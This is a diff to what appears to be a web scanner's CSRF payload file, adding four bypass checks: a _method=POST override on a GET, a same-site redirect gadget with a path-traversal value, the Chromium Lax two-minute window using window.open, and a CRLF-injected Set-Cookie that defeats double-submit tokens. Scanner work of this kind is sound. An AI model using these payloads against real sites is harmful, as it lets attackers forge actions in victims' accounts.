@@ -133,6 +133,38 @@
           "severity": "medium",
           "confidence_boost": 30,
           "variables": {"method": "GET", "delivery": "window.open"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "SameSite=Lax bypass via method override on a GET -- send the state-changing action as a top-level GET (Lax cookies attach) carrying _method=POST so the framework routes it to the POST handler. Bypasses Lax without needing the 2-minute window.",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["forbidden", "csrf", "unauthorized", "method not allowed", "405"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"method": "GET", "extra_param": "_method=POST"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "SameSite=Strict bypass via an on-site client-side-redirect gadget -- Strict cookies attach on any same-site request, so bounce through a same-site endpoint whose redirect parameter accepts a path-traversal value (e.g. /redirect?next=/../../admin/delete?id=1) to reach the target action from within the origin. The gadget performs the sensitive request itself, carrying the Strict cookie.",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["forbidden", "csrf", "unauthorized", "invalid redirect"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"redirect_gadget": "/../../"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "SameSite=Lax 2-minute window via window.open then delayed auto-submit -- window.open() establishes a fresh top-level navigation so Chromium treats subsequent cross-site POSTs as Lax-eligible for ~2 min; a setTimeout-delayed form auto-submit fires the state-changing POST inside that window.",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["forbidden", "csrf", "unauthorized"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"delivery": "window.open", "method": "POST", "timing_window": "120s"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "CSRF token tied to a non-session cookie set independently via CRLF/response-splitting -- if the anti-CSRF token is validated against a cookie the attacker can plant (rather than the session), inject a Set-Cookie through a CRLF-reflecting parameter to fix both the cookie and the form token to the same known value, defeating double-submit.",
+          "matchers": [{"type": "header", "name": "Set-Cookie", "contains": "csrf=fake"}],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"crlf_inject": "search=x%0d%0aSet-Cookie:%20csrf=fake;%20SameSite=None"}
         }
       ]
     },
